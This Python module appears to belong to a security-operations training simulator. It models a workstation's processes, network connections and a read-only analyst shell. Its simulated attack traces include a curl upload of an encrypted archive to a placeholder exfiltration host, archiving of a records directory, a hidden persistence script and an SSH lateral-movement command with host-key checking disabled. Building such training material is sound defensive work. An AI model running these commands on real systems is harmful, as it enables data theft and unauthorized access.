"""
shell.py — the simulated workstation: process table, network state and a remote
shell an analyst can drive from the dashboard.

`Machine` wraps a virtual filesystem (vfs.py) with the rest of what a real
endpoint exposes to an investigator: running processes, established connections,
login sessions, disk and memory usage. `Machine.run(cmdline)` interprets an
ordinary shell command against that state and returns the text a terminal would
print.

This is a simulation end to end. No command reaches a real machine; the point is
that what an analyst finds here corroborates what the detection agents are
reporting about the same entity.
"""
from __future__ import annotations
import shlex
import time
from typing import Dict, List, Optional, Tuple

from . import entities as E
from . import vfs
from .vfs import Node

BOOT = time.time() - 3600 * 29 - 1140          # ~1 day 5 h uptime


# ------------------------------------------------------------------ processes
def _base_procs(e: E.Entity) -> List[dict]:
    u = e.username
    p = [
        dict(pid=1, user="root", cpu=0.0, mem=0.1, cmd="/sbin/init splash"),
        dict(pid=412, user="root", cpu=0.0, mem=0.2, cmd="/lib/systemd/systemd-journald"),
        dict(pid=598, user="root", cpu=0.0, mem=0.3, cmd="/usr/sbin/NetworkManager --no-daemon"),
        dict(pid=712, user="root", cpu=0.0, mem=0.2, cmd="/usr/sbin/sshd -D"),
        dict(pid=904, user=u, cpu=0.4, mem=1.8, cmd="/usr/bin/gnome-shell"),
        dict(pid=1120, user=u, cpu=1.2, mem=4.6, cmd="/usr/lib/firefox/firefox"),
        dict(pid=1201, user=u, cpu=0.1, mem=0.4, cmd="bash"),
    ]
    if e.category == "ICT Unit":
        p += [dict(pid=1502, user="root", cpu=0.3, mem=1.1, cmd="/usr/bin/zabbix_agentd"),
              dict(pid=1610, user=u, cpu=0.2, mem=0.9, cmd="ssh admin@10.21.0.2")]
    elif e.category == "Postgraduate Research":
        p += [dict(pid=1733, user=u, cpu=88.4, mem=22.1, cmd="python3 train.py --epochs 40")]
    elif e.category == "Technical Staff":
        p += [dict(pid=1444, user=u, cpu=0.2, mem=0.7, cmd="wireshark")]
    elif e.category == "Academic Staff":
        p += [dict(pid=1355, user=u, cpu=0.3, mem=2.2, cmd="libreoffice --writer")]
    return p


def _attack_procs(e: E.Entity, kinds: List[str]) -> List[dict]:
    u, out = e.username, []
    if "file" in kinds or "exfil" in kinds:
        out.append(dict(pid=3312, user=u, cpu=12.6, mem=1.3,
                        cmd=f"tar -czf /home/{u}/{vfs.STAGING_DIR}/archive_003.tar.gz /srv/records",
                        suspicious=True))
    if "network" in kinds or "exfil" in kinds:
        out.append(dict(pid=3410, user=u, cpu=3.1, mem=0.6,
                        cmd=f"/bin/sh /home/{u}/.cache/upload.sh", suspicious=True))
        out.append(dict(pid=3411, user=u, cpu=6.8, mem=0.5,
                        cmd=f"curl -s -T archive_002.tar.gz.enc https://{E.EXFIL_DST}/u/",
                        suspicious=True))
    if "host" in kinds:
        out.append(dict(pid=3208, user=u, cpu=0.2, mem=0.2,
                        cmd=f"/bin/sh /home/{u}/.sysupdate", suspicious=True))
    if "identity" in kinds or "lateral" in kinds:
        out.append(dict(pid=3505, user=u, cpu=0.1, mem=0.3,
                        cmd="ssh -o StrictHostKeyChecking=no root@10.21.0.10", suspicious=True))
    return out


def _base_conns(e: E.Entity) -> List[dict]:
    return [
        dict(proto="tcp", local=f"{e.ip}:51422", remote="10.21.0.5:53", state="ESTABLISHED", proc="systemd-resolve"),
        dict(proto="tcp", local=f"{e.ip}:44980", remote="10.21.0.10:443", state="ESTABLISHED", proc="firefox"),
        dict(proto="tcp", local="0.0.0.0:22", remote="0.0.0.0:*", state="LISTEN", proc="sshd"),
    ]


def _attack_conns(e: E.Entity, kinds: List[str]) -> List[dict]:
    out = []
    if "network" in kinds or "exfil" in kinds:
        out.append(dict(proto="tcp", local=f"{e.ip}:49512", remote=f"{E.EXFIL_DST}:443",
                        state="ESTABLISHED", proc="curl", suspicious=True))
    if "host" in kinds:
        out.append(dict(proto="tcp", local=f"{e.ip}:49688", remote=f"{E.EXFIL_DST}:443",
                        state="TIME_WAIT", proc="sh", suspicious=True))
    if "lateral" in kinds or "identity" in kinds:
        out.append(dict(proto="tcp", local=f"{e.ip}:38210", remote="10.21.0.10:22",
                        state="ESTABLISHED", proc="ssh", suspicious=True))
    return out


# -------------------------------------------------------------------- machine
class Machine:
    def __init__(self, uid: str):
        self.uid = uid
        self.e = E.get(uid)
        self.root = vfs.build_machine(uid)
        self.active_kinds: List[str] = []
        self.cwd = f"/home/{self.e.username}"
        self.history: List[str] = []
        self._planted: List[str] = []

    # ---- incident state --------------------------------------------------
    def set_attack(self, kinds: List[str]) -> None:
        """Mark which simulation kinds are live on this machine and grow traces."""
        new = [k for k in kinds if k not in self._planted]
        self.active_kinds = sorted(set(self.active_kinds) | set(kinds))
        if new:
            vfs.plant_artifacts(self.root, self.e, new)
            self._planted += new

    def clear_attack(self) -> None:
        self.active_kinds = []

    # ---- state views -----------------------------------------------------
    def processes(self) -> List[dict]:
        return _base_procs(self.e) + _attack_procs(self.e, self.active_kinds)

    def connections(self) -> List[dict]:
        if self.e.isolated:
            return [c for c in _base_conns(self.e) if c["state"] == "LISTEN"]
        return _base_conns(self.e) + _attack_conns(self.e, self.active_kinds)

    def sessions(self) -> List[dict]:
        u = self.e.username
        s = [dict(user=u, tty="tty2", frm=":0", login="07:55", idle="00:02", what="gnome-shell")]
        if "identity" in self.active_kinds or "lateral" in self.active_kinds:
            s.append(dict(user=u, tty="pts/1", frm="10.21.60.22", login="01:45",
                          idle="00:00", what="-bash", suspicious=True))
        return s

    def stats(self) -> dict:
        base_cpu = sum(p["cpu"] for p in self.processes())
        base_mem = sum(p["mem"] for p in self.processes())
        up = time.time() - BOOT
        return {
            "cpu": round(min(99.0, base_cpu), 1),
            "mem": round(min(99.0, base_mem), 1),
            "disk_used_gb": 118 + (len(self.active_kinds) * 3),
            "disk_total_gb": 256,
            "uptime": f"{int(up // 86400)} days, {int(up % 86400 // 3600)}:{int(up % 3600 // 60):02d}",
            "load": f"{0.32 + len(self.active_kinds) * 0.9:.2f}, {0.28 + len(self.active_kinds) * 0.6:.2f}, {0.22:.2f}",
        }

    def summary(self) -> dict:
        e = self.e
        return {
            "uid": self.uid, "host": e.host, "ip": e.ip, "mac": e.mac, "os": e.os,
            "user": e.username, "name": e.name, "isolated": e.isolated,
            "traffic_paused": e.traffic_paused, "active_kinds": self.active_kinds,
            "stats": self.stats(),
            "processes": self.processes(),
            "connections": self.connections(),
            "sessions": self.sessions(),
        }

    # ---- filesystem helpers ---------------------------------------------
    def _resolve(self, path: str) -> Optional[Node]:
        if not path:
            path = self.cwd
        if not path.startswith("/"):
            path = (self.cwd.rstrip("/") + "/" + path) if self.cwd != "/" else "/" + path
        parts: List[str] = []
        for seg in path.split("/"):
            if seg in ("", "."):
                continue
            if seg == "..":
                if parts:
                    parts.pop()
                continue
            if seg == "~":
                parts = ["home", self.e.username]
                continue
            parts.append(seg)
        node = self.root
        for seg in parts:
            if not node.is_dir or seg not in node.children:
                return None
            node = node.children[seg]
        return node

    @staticmethod
    def _abspath(cwd: str, path: str) -> str:
        if path.startswith("/"):
            raw = path
        else:
            raw = (cwd.rstrip("/") + "/" + path) if cwd != "/" else "/" + path
        parts: List[str] = []
        for seg in raw.split("/"):
            if seg in ("", "."):
                continue
            if seg == "..":
                if parts:
                    parts.pop()
                continue
            parts.append(seg)
        return "/" + "/".join(parts)

    # ---- the shell -------------------------------------------------------
    def prompt(self) -> str:
        home = f"/home/{self.e.username}"
        shown = "~" + self.cwd[len(home):] if self.cwd.startswith(home) else self.cwd
        return f"{self.e.username}@{self.e.host}:{shown}$"

    def run(self, line: str) -> str:
        line = (line or "").strip()
        if not line:
            return ""
        self.history.append(line)
        # support a single pipe into grep/head/tail/wc
        if "|" in line:
            left, right = line.split("|", 1)
            out = self.run(left.strip())
            return self._pipe(out, right.strip())
        try:
            argv = shlex.split(line)
        except ValueError:
            argv = line.split()
        cmd, args = argv[0], argv[1:]
        fn = getattr(self, "_cmd_" + cmd.replace("-", "_"), None)
        if fn is None:
            return f"{cmd}: command not found"
        try:
            return fn(args)
        except Exception as ex:                       # keep the shell alive
            return f"{cmd}: {ex}"

    def _pipe(self, text: str, rest: str) -> str:
        argv = rest.split()
        if not argv:
            return text
        c, a = argv[0], argv[1:]
        lines = text.split("\n")
        if c == "grep":
            flags = [x for x in a if x.startswith("-")]
            pat = next((x for x in a if not x.startswith("-")), "")
            ci = "-i" in flags
            keep = [l for l in lines if (pat.lower() in l.lower() if ci else pat in l)]
            return "\n".join(keep)
        if c == "head":
            n = int(a[a.index("-n") + 1]) if "-n" in a else 10
            return "\n".join(lines[:n])
        if c == "tail":
            n = int(a[a.index("-n") + 1]) if "-n" in a else 10
            return "\n".join(lines[-n:])
        if c == "wc":
            if "-l" in a:
                return str(len([l for l in lines if l]))
            return f"{len(lines)} {len(text.split())} {len(text)}"
        if c == "sort":
            return "\n".join(sorted(lines))
        return text

    # ---------------- individual commands ----------------
    def _cmd_help(self, a):
        return ("Available commands:\n"
                "  files      ls  cd  pwd  cat  head  tail  find  grep  stat  file  wc  tree\n"
                "  system     whoami  id  hostname  uname  uptime  date  env  history  clear\n"
                "  users      w  who  last\n"
                "  processes  ps  top  kill\n"
                "  network    ip  ifconfig  netstat  ss  ping  arp  curl  wget\n"
                "  storage    df  free  du  mount  lsblk\n"
                "  other      which  echo  sudo  apt  exit\n"
                "Pipes to grep / head / tail / wc / sort are supported.")

    def _cmd_pwd(self, a): return self.cwd

    def _cmd_whoami(self, a): return self.e.username

    def _cmd_id(self, a):
        u = self.e.username
        return f"uid=1000({u}) gid=1000({u}) groups=1000({u}),4(adm),27(sudo)"

    def _cmd_hostname(self, a): return self.e.host

    def _cmd_uname(self, a):
        if "-a" in a:
            return (f"Linux {self.e.host} 6.5.0-27-generic #28-Ubuntu SMP "
                    f"x86_64 GNU/Linux  [{self.e.os}]")
        return "Linux"

    def _cmd_date(self, a): return time.strftime("%a %d %b %Y %H:%M:%S WAT")

    def _cmd_uptime(self, a):
        s = self.stats()
        return f" {time.strftime('%H:%M:%S')} up {s['uptime']},  2 users,  load average: {s['load']}"

    def _cmd_echo(self, a): return " ".join(a)

    def _cmd_clear(self, a): return "\x1b[CLEAR]"

    def _cmd_exit(self, a): return "\x1b[EXIT]"

    def _cmd_history(self, a):
        return "\n".join(f"{i+1:5d}  {h}" for i, h in enumerate(self.history[-40:]))

    def _cmd_env(self, a):
        u = self.e.username
        return (f"USER={u}\nHOME=/home/{u}\nSHELL=/bin/bash\nPWD={self.cwd}\n"
                f"HOSTNAME={self.e.host}\nLANG=en_NG.UTF-8\nTZ=Africa/Lagos")

    def _cmd_cd(self, a):
        target = a[0] if a else f"/home/{self.e.username}"
        if target == "~":
            target = f"/home/{self.e.username}"
        if target == "-":
            target = f"/home/{self.e.username}"
        node = self._resolve(target)
        if node is None:
            return f"cd: {target}: No such file or directory"
        if not node.is_dir:
            return f"cd: {target}: Not a directory"
        self.cwd = self._abspath(self.cwd, target)
        return ""

    def _cmd_ls(self, a):
        flags = "".join(x[1:] for x in a if x.startswith("-"))
        paths = [x for x in a if not x.startswith("-")] or ["."]
        out = []
        for p in paths:
            node = self._resolve(p)
            if node is None:
                out.append(f"ls: cannot access '{p}': No such file or directory"); continue
            items = [node] if not node.is_dir else list(node.children.values())
            if node.is_dir and "a" not in flags:
                items = [n for n in items if not n.name.startswith(".")]
            items.sort(key=lambda n: (not n.is_dir, n.name))
            if "l" in flags:
                rows = [f"total {sum(max(1, n.size // 1024) for n in items)}"]
                for n in items:
                    size = f"{n.size/1024:.1f}K" if "h" in flags and n.size > 1024 else str(n.size)
                    mark = "  <-- flagged" if n.flagged else ""
                    rows.append(f"{n.mode} 1 {n.owner:<10} {n.group:<10} {size:>8} {n.mtime} "
                                f"{n.name}{'/' if n.is_dir else ''}{mark}")
                out.append("\n".join(rows))
            else:
                out.append("  ".join(n.name + ("/" if n.is_dir else "") for n in items))
        return "\n".join(out)

    def _cmd_cat(self, a):
        if not a:
            return "cat: missing operand"
        out = []
        for p in a:
            node = self._resolve(p)
            if node is None:
                out.append(f"cat: {p}: No such file or directory")
            elif node.is_dir:
                out.append(f"cat: {p}: Is a directory")
            elif node.mode.startswith("-rw-r-----") and "shadow" in node.name:
                out.append(f"cat: {p}: Permission denied")
            else:
                out.append(node.content.rstrip("\n"))
        return "\n".join(out)

    def _cmd_head(self, a):
        n = int(a[a.index("-n") + 1]) if "-n" in a else 10
        files = [x for x in a if not x.startswith("-") and not x.isdigit()]
        return "\n".join(self._cmd_cat(files).split("\n")[:n])

    def _cmd_tail(self, a):
        n = int(a[a.index("-n") + 1]) if "-n" in a else 10
        files = [x for x in a if not x.startswith("-") and not x.isdigit()]
        return "\n".join(self._cmd_cat(files).split("\n")[-n:])

    def _cmd_wc(self, a):
        files = [x for x in a if not x.startswith("-")]
        text = self._cmd_cat(files)
        if "-l" in a:
            return f"{len(text.split(chr(10)))} {' '.join(files)}"
        return f"{len(text.split(chr(10)))} {len(text.split())} {len(text)} {' '.join(files)}"

    def _cmd_stat(self, a):
        node = self._resolve(a[0]) if a else None
        if node is None:
            return f"stat: cannot stat '{a[0] if a else ''}': No such file or directory"
        return (f"  File: {a[0]}\n  Size: {node.size}\t Blocks: {max(1, node.size//512)}\n"
                f"Access: ({node.mode})  Uid: ({node.owner})   Gid: ({node.group})\n"
                f"Modify: {node.mtime}")

    def _cmd_file(self, a):
        node = self._resolve(a[0]) if a else None
        if node is None:
            return f"{a[0] if a else ''}: cannot open"
        if node.is_dir:
            return f"{a[0]}: directory"
        if node.name.endswith(".enc"):
            return f"{a[0]}: openssl enc'd data, salted"
        if node.name.endswith(".gz"):
            return f"{a[0]}: gzip compressed data"
        if node.content.startswith("#!"):
            return f"{a[0]}: POSIX shell script, ASCII text executable"
        return f"{a[0]}: ASCII text"

    def _cmd_tree(self, a):
        start = self._resolve(a[0]) if a else self._resolve(".")
        if start is None:
            return "tree: no such directory"
        lines: List[str] = [a[0] if a else "."]

        def walk(n: Node, prefix: str):
            kids = sorted(n.children.values(), key=lambda x: (not x.is_dir, x.name))
            for i, k in enumerate(kids):
                last = i == len(kids) - 1
                lines.append(prefix + ("└── " if last else "├── ") + k.name + ("/" if k.is_dir else ""))
                if k.is_dir:
                    walk(k, prefix + ("    " if last else "│   "))
        walk(start, "")
        return "\n".join(lines)

    def _cmd_find(self, a):
        start_path = next((x for x in a if not x.startswith("-")), ".")
        name_pat = a[a.index("-name") + 1].strip("*") if "-name" in a else ""
        start = self._resolve(start_path)
        if start is None:
            return f"find: '{start_path}': No such file or directory"
        hits: List[str] = []

        def walk(n: Node, path: str):
            if name_pat in n.name:
                hits.append(path)
            for k in n.children.values():
                walk(k, path.rstrip("/") + "/" + k.name)
        walk(start, self._abspath(self.cwd, start_path))
        return "\n".join(hits) if hits else ""

    def _cmd_grep(self, a):
        flags = [x for x in a if x.startswith("-")]
        rest = [x for x in a if not x.startswith("-")]
        if not rest:
            return "usage: grep [-i] PATTERN FILE..."
        pat, files = rest[0], rest[1:]
        ci = "-i" in flags
        out = []
        for f in files:
            node = self._resolve(f)
            if node is None or node.is_dir:
                continue
            for l in node.content.split("\n"):
                if (pat.lower() in l.lower()) if ci else (pat in l):
                    out.append(f"{f}:{l}" if len(files) > 1 else l)
        return "\n".join(out)

    def _cmd_ps(self, a):
        rows = ["  PID USER       %CPU %MEM COMMAND"]
        for p in self.processes():
            mark = "   *" if p.get("suspicious") else ""
            rows.append(f"{p['pid']:>5} {p['user']:<10} {p['cpu']:>4} {p['mem']:>4} {p['cmd']}{mark}")
        if any(p.get("suspicious") for p in self.processes()):
            rows.append("\n* marked processes were flagged by the endpoint agent")
        return "\n".join(rows)

    def _cmd_top(self, a):
        s = self.stats()
        head = (f"top - {time.strftime('%H:%M:%S')} up {s['uptime']},  load average: {s['load']}\n"
                f"%Cpu(s): {s['cpu']:.1f} us   MiB Mem: {s['mem']:.1f}% used\n")
        return head + self._cmd_ps([])

    def _cmd_kill(self, a):
        return "kill: operation not permitted from the analyst console (use Isolate instead)"

    def _cmd_ip(self, a):
        if a and a[0] in ("a", "addr"):
            return self._cmd_ifconfig([])
        if a and a[0] in ("r", "route"):
            return f"default via 10.21.0.1 dev eth0\n{'.'.join(self.e.ip.split('.')[:3])}.0/24 dev eth0 proto kernel"
        return self._cmd_ifconfig([])

    def _cmd_ifconfig(self, a):
        st = "DOWN (isolated by SOC)" if self.e.isolated else "UP,BROADCAST,RUNNING,MULTICAST"
        return (f"eth0: flags=4163<{st}>  mtu 1500\n"
                f"        inet {self.e.ip}  netmask 255.255.255.0  broadcast "
                f"{'.'.join(self.e.ip.split('.')[:3])}.255\n"
                f"        ether {self.e.mac.lower()}  txqueuelen 1000  (Ethernet)\n"
                f"lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1")

    def _cmd_netstat(self, a):
        rows = ["Proto Local Address          Foreign Address        State        Process"]
        for c in self.connections():
            mark = "  *" if c.get("suspicious") else ""
            rows.append(f"{c['proto']:<5} {c['local']:<22} {c['remote']:<22} {c['state']:<12} {c['proc']}{mark}")
        if self.e.isolated:
            rows.append("\n(host is isolated — outbound connections have been severed)")
        return "\n".join(rows)

    def _cmd_ss(self, a): return self._cmd_netstat(a)

    def _cmd_arp(self, a):
        net = ".".join(self.e.ip.split(".")[:3])
        return (f"Address       HWtype  HWaddress           Iface\n"
                f"{net}.1     ether   00:1a:2b:3c:4d:5e   eth0\n"
                f"10.21.0.5     ether   00:1a:2b:3c:4d:60   eth0")

    def _cmd_ping(self, a):
        if not a:
            return "usage: ping HOST"
        host = a[0]
        if self.e.isolated:
            return f"ping: connect: Network is unreachable  (host isolated by SOC)"
        if host.startswith("10.") or host.startswith("192."):
            return (f"PING {host} 56 bytes of data.\n64 bytes from {host}: icmp_seq=1 ttl=64 time=0.42 ms\n"
                    f"64 bytes from {host}: icmp_seq=2 ttl=64 time=0.38 ms\n"
                    f"--- {host} ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss")
        return f"ping: {host}: Name or service not known"

    def _cmd_curl(self, a):
        if self.e.isolated:
            return "curl: (7) Failed to connect — host isolated by SOC"
        return "curl: (28) Connection timed out  [egress filtered by campus proxy]"

    def _cmd_wget(self, a): return self._cmd_curl(a)

    def _cmd_df(self, a):
        s = self.stats()
        used, tot = s["disk_used_gb"], s["disk_total_gb"]
        pct = int(used / tot * 100)
        return ("Filesystem      Size  Used Avail Use% Mounted on\n"
                f"/dev/nvme0n1p2  {tot}G  {used}G  {tot-used}G  {pct}% /\n"
                "tmpfs           7.8G  1.2M  7.8G   1% /dev/shm")

    def _cmd_free(self, a):
        s = self.stats()
        used = int(160 * s["mem"] / 100)
        return ("               total        used        free\n"
                f"Mem:            16Gi        {used}Gi        {16-used//10}Gi\n"
                "Swap:          2.0Gi          0B       2.0Gi")

    def _cmd_du(self, a):
        node = self._resolve(a[-1] if a and not a[-1].startswith("-") else ".")
        if node is None:
            return "du: cannot access"
        tot = [0]

        def walk(n: Node):
            tot[0] += n.size
            for k in n.children.values():
                walk(k)
        walk(node)
        return f"{tot[0]//1024 or 1}K\t{a[-1] if a else '.'}"

    def _cmd_lsblk(self, a):
        return ("NAME        SIZE TYPE MOUNTPOINT\n"
                "nvme0n1     256G disk\n├─nvme0n1p1 512M part /boot/efi\n└─nvme0n1p2 255G part /")

    def _cmd_mount(self, a):
        return ("/dev/nvme0n1p2 on / type ext4 (rw,relatime)\n"
                "tmpfs on /dev/shm type tmpfs (rw,nosuid)")

    def _cmd_w(self, a):
        rows = ["USER     TTY      FROM             LOGIN@   IDLE   WHAT"]
        for s in self.sessions():
            mark = "  *" if s.get("suspicious") else ""
            rows.append(f"{s['user']:<8} {s['tty']:<8} {s['frm']:<16} {s['login']:<8} {s['idle']:<6} {s['what']}{mark}")
        return "\n".join(rows)

    def _cmd_who(self, a): return self._cmd_w(a)

    def _cmd_last(self, a):
        u = self.e.username
        rows = [f"{u:<9} tty2         :0               Mon Apr  7 07:55   still logged in"]
        if "identity" in self.active_kinds or "lateral" in self.active_kinds:
            rows.insert(0, f"{u:<9} pts/1        10.21.60.22      Mon Apr  7 01:45   still logged in  *")
        rows += [f"{u:<9} tty2         :0               Fri Apr  4 08:02 - 17:31  (09:29)",
                 "reboot    system boot  6.5.0-27-generic Fri Apr  4 07:58"]
        return "\n".join(rows)

    def _cmd_which(self, a):
        known = {"python3": "/usr/bin/python3", "bash": "/bin/bash", "ssh": "/usr/bin/ssh",
                 "curl": "/usr/bin/curl", "tar": "/bin/tar", "ls": "/bin/ls"}
        return "\n".join(known.get(x, f"{x} not found") for x in a) if a else ""

    def _cmd_sudo(self, a):
        return (f"[sudo] password for {self.e.username}: \n"
                "sudo: a password is required — the analyst console runs read-only.\n"
                "Use the Isolate control on the dashboard for containment actions.")

    def _cmd_apt(self, a): return self._cmd_sudo(a)

    def _cmd_nano(self, a): return "nano: interactive editors are not available in the analyst console"

    def _cmd_vim(self, a): return self._cmd_nano(a)

    def _cmd_ssh(self, a):
        return ("ssh: the analyst console is already a remote session on this host.\n"
                "Open another machine from the Entities page to inspect it.")
